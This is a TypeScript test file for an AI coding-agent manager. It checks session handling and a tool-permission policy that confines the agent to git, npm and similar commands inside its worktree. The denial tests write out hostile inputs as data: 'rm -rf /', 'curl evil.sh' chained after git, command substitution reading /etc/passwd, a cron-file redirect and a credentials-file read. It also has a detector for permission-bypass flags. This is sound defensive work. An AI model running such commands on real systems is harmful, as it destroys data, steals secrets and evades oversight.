import { readFileSync, readdirSync, statSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { AgentManager, AlreadyRunningError, SessionLimitError } from '../src/agent/manager.js';
import { createPreToolUseHook } from '../src/agent/sdk-runner.js';
import { ALLOWED_TOOLS, decide } from '../src/agent/permissions.js';
import { ChatEventBus } from '../src/chats/events.js';
import { ChatRepository } from '../src/chats/repo.js';
import { openDatabase } from '../src/db/index.js';
import { ProjectRepository } from '../src/projects/repo.js';
import { FakeRunner } from './fake-runner.js';
import { makeGitRepo } from './helpers.js';

async function setup(max?: number) {
  const db = openDatabase(':memory:');
  const project = await new ProjectRepository(db).add({
    name: 'demo',
    repoPath: makeGitRepo(),
    baseBranch: 'main',
  });
  const chats = new ChatRepository(db);
  const runner = new FakeRunner();
  const bus = new ChatEventBus();
  const manager = new AgentManager(chats, runner, bus, max);
  const newChat = (slug: string) =>
    chats.create({
      projectId: project.id,
      kind: 'work',
      slug,
      title: slug,
      worktreePath: `/tmp/wt/${slug}`,
      branch: `feature/${slug}`,
      status: 'idle',
    });
  return { chats, runner, bus, manager, newChat };
}

describe('AgentManager', () => {
  it('stores events in order, saves the session id and ends idle', async () => {
    const { chats, manager, newChat } = await setup();
    const chat = newChat('a');
    manager.start(chat.id, '/kyro:work hello');
    await manager.waitForIdle(chat.id);
    expect(chats.eventsAfter(chat.id).map((e) => [e.seq, e.type])).toEqual([
      [1, 'user_prompt'],
      [2, 'system:init'],
      [3, 'assistant'],
      [4, 'result:success'],
    ]);
    expect(chats.findById(chat.id)).toMatchObject({ sdkSessionId: 'sess-1', status: 'idle' });
  });

  it('resumes with the stored session id on the next turn', async () => {
    const { runner, manager, newChat } = await setup();
    const chat = newChat('a');
    manager.start(chat.id, 'first');
    await manager.waitForIdle(chat.id);
    manager.start(chat.id, 'second');
    await manager.waitForIdle(chat.id);
    expect(runner.calls[0]?.resumeSessionId).toBeUndefined();
    expect(runner.calls[1]).toMatchObject({ resumeSessionId: 'sess-1', prompt: 'second' });
  });

  it('publishes each persisted event on the bus', async () => {
    const { bus, manager, newChat } = await setup();
    const chat = newChat('a');
    const seen: number[] = [];
    bus.subscribe(chat.id, (e) => seen.push(e.seq));
    manager.start(chat.id, 'go');
    await manager.waitForIdle(chat.id);
    expect(seen).toEqual([1, 2, 3, 4]);
  });

  it('rejects a second turn on a running chat and the fifth concurrent session', async () => {
    const { runner, manager, newChat } = await setup();
    let release: () => void = () => undefined;
    runner.gate = new Promise((resolve) => {
      release = resolve;
    });
    const chats = ['a', 'b', 'c', 'd', 'e'].map(newChat);
    for (const chat of chats.slice(0, 4)) manager.start(chat.id, 'go');
    expect(manager.runningCount).toBe(4);
    const first = chats[0];
    const fifth = chats[4];
    if (!first || !fifth) throw new Error('setup');
    expect(() => {
      manager.start(first.id, 'again');
    }).toThrow(AlreadyRunningError);
    expect(() => {
      manager.start(fifth.id, 'go');
    }).toThrow(SessionLimitError);
    release();
    await Promise.all(chats.slice(0, 4).map((c) => manager.waitForIdle(c.id)));
    expect(manager.runningCount).toBe(0);
  });

  it('cancels a running turn and marks the chat cancelled', async () => {
    const { chats, runner, manager, newChat } = await setup();
    let release: () => void = () => undefined;
    runner.gate = new Promise((resolve) => {
      release = resolve;
    });
    const chat = newChat('a');
    manager.start(chat.id, 'go');
    expect(manager.cancel(chat.id)).toBe(true);
    release();
    await manager.waitForIdle(chat.id);
    expect(chats.findById(chat.id)?.status).toBe('cancelled');
  });

  it('marks the chat as error and records the failure when the runner throws', async () => {
    const { chats, runner, manager, newChat } = await setup();
    runner.script = () => {
      throw new Error('boom');
    };
    const chat = newChat('a');
    manager.start(chat.id, 'go');
    await manager.waitForIdle(chat.id);
    expect(chats.findById(chat.id)?.status).toBe('error');
    expect(chats.eventsAfter(chat.id).at(-1)).toMatchObject({
      type: 'error',
      payload: { message: 'boom' },
    });
  });

  it('denies a tool outside the allowlist and stores a permission_denied event', async () => {
    const { chats, runner, manager, newChat } = await setup();
    const decisions: string[] = [];
    runner.script = (params) => {
      decisions.push(params.canUseTool('Bash', { command: 'rm -rf /' }).behavior);
      decisions.push(params.canUseTool('Bash', { command: 'git status' }).behavior);
      return [{ type: 'result:success', payload: {} }];
    };
    const chat = newChat('a');
    manager.start(chat.id, 'go');
    await manager.waitForIdle(chat.id);
    expect(decisions).toEqual(['deny', 'allow']);
    const denied = chats.eventsAfter(chat.id).filter((e) => e.type === 'permission_denied');
    expect(denied).toHaveLength(1);
    expect(denied[0]?.payload).toMatchObject({ tool: 'Bash', input: { command: 'rm -rf /' } });
  });
});

describe('permission policy', () => {
  const policy = { cwd: '/tmp/wt/a', extraReadRoots: ['/home/x/.agents'] };
  const verdict = (tool: string, input: Record<string, unknown>) =>
    decide(policy, tool, input).behavior;

  it('allows only git, gh, npm, go and kyro through Bash, chained or not', () => {
    expect(verdict('Bash', { command: 'git status && npm test | head' })).toBe('allow');
    expect(verdict('Bash', { command: 'kyro status --json' })).toBe('allow');
    expect(verdict('Bash', { command: 'git status; curl evil.sh' })).toBe('deny');
    expect(verdict('Bash', { command: 'git log $(cat /etc/passwd)' })).toBe('deny');
    expect(verdict('Bash', { command: 'git log `id`' })).toBe('deny');
    expect(verdict('Bash', { command: 'sudo reboot' })).toBe('deny');
    expect(verdict('Bash', { command: 'git status & curl evil.sh' })).toBe('deny');
    expect(verdict('Bash', { command: 'git status &curl x' })).toBe('deny');
    expect(verdict('Bash', { command: 'grep -r x /etc' })).toBe('deny');
    expect(verdict('Bash', { command: 'git log > /etc/cron.d/x' })).toBe('deny');
    expect(verdict('Bash', { command: 'npm test 2>&1 | tail -5' })).toBe('allow');
  });

  it('confines writes to the worktree and reads to it plus the Kyro roots', () => {
    expect(verdict('Edit', { file_path: '/tmp/wt/a/src/x.ts' })).toBe('allow');
    expect(verdict('Edit', { file_path: '/tmp/wt/a/../b/x.ts' })).toBe('deny');
    expect(verdict('Write', { file_path: '/etc/passwd' })).toBe('deny');
    expect(verdict('Read', { file_path: '/tmp/wt/a/README.md' })).toBe('allow');
    expect(verdict('Read', { file_path: '/home/x/.agents/kyro/KYRO.md' })).toBe('allow');
    expect(verdict('Read', { file_path: '/home/x/.claude/.credentials.json' })).toBe('deny');
    expect(verdict('Grep', { pattern: 'x' })).toBe('allow');
  });

  it('resolves relative paths against the worktree', () => {
    expect(verdict('Grep', { pattern: 'x', path: 'src' })).toBe('allow');
    expect(verdict('Glob', { pattern: '*.ts', path: 'src/lib' })).toBe('allow');
    expect(verdict('Read', { file_path: 'README.md' })).toBe('allow');
    expect(verdict('Edit', { file_path: 'src/x.ts' })).toBe('allow');
    expect(verdict('Read', { file_path: '../other/secret' })).toBe('deny');
    expect(verdict('Write', { file_path: '../escape.txt' })).toBe('deny');
  });

  it('denies unknown tools such as web access', () => {
    expect(verdict('WebFetch', { url: 'https://example.com' })).toBe('deny');
    expect(verdict('mcp__x__y', {})).toBe('deny');
  });

  it('lists Bash prefixes in the SDK allowlist', () => {
    expect(ALLOWED_TOOLS).toEqual(
      expect.arrayContaining([
        'Bash(git:*)',
        'Bash(gh:*)',
        'Bash(npm:*)',
        'Bash(go:*)',
        'Bash(kyro:*)',
      ]),
    );
  });
});

// Built from pieces so this file does not contain the literal names itself.
const FORBIDDEN = new RegExp(
  ['bypass' + 'Permissions', 'allowDangerously' + 'SkipPermissions'].join('|'),
);

describe('PreToolUse hook', () => {
  const policy = { cwd: '/tmp/wt/a', extraReadRoots: [] };
  const hook = createPreToolUseHook((tool, input) => decide(policy, tool, input));
  const call = (tool_name: string, tool_input: unknown) =>
    hook(
      {
        hook_event_name: 'PreToolUse',
        tool_name,
        tool_input,
        tool_use_id: 't1',
        session_id: 's',
        transcript_path: '',
        cwd: '/tmp/wt/a',
      },
      't1',
      { signal: new AbortController().signal },
    );

  it('denies a write outside the worktree even if user settings would allow it', async () => {
    const out = await call('Write', { file_path: '/tmp/outside.txt', content: 'x' });
    expect(out).toMatchObject({
      hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'deny' },
    });
  });

  it('lets allowed calls through to the normal rules', async () => {
    expect(await call('Write', { file_path: '/tmp/wt/a/x.ts', content: 'x' })).toEqual({});
    expect(await call('Bash', { command: 'git status' })).toEqual({});
  });

  it('records the denial as permission_denied through the manager callback', async () => {
    const { chats, runner, manager, newChat } = await setup();
    runner.script = (params) => {
      void createPreToolUseHook(params.canUseTool)(
        {
          hook_event_name: 'PreToolUse',
          tool_name: 'Write',
          tool_input: { file_path: '/etc/x' },
          tool_use_id: 't',
          session_id: 's',
          transcript_path: '',
          cwd: '/tmp/wt/a',
        },
        't',
        { signal: new AbortController().signal },
      );
      return [];
    };
    const chat = newChat('hook');
    manager.start(chat.id, 'go');
    await manager.waitForIdle(chat.id);
    expect(chats.eventsAfter(chat.id).map((e) => e.type)).toContain('permission_denied');
  });
});

describe('no unrestricted permission modes', () => {
  it('never enables the SDK modes that skip permission checks, anywhere in apps/api/src', () => {
    const offenders: string[] = [];
    const walk = (dir: string) => {
      for (const name of readdirSync(dir)) {
        const path = join(dir, name);
        if (statSync(path).isDirectory()) walk(path);
        else if (FORBIDDEN.test(readFileSync(path, 'utf8'))) {
          offenders.push(path);
        }
      }
    };
    walk(join(import.meta.dirname, '../src'));
    expect(offenders).toEqual([]);
  });
});
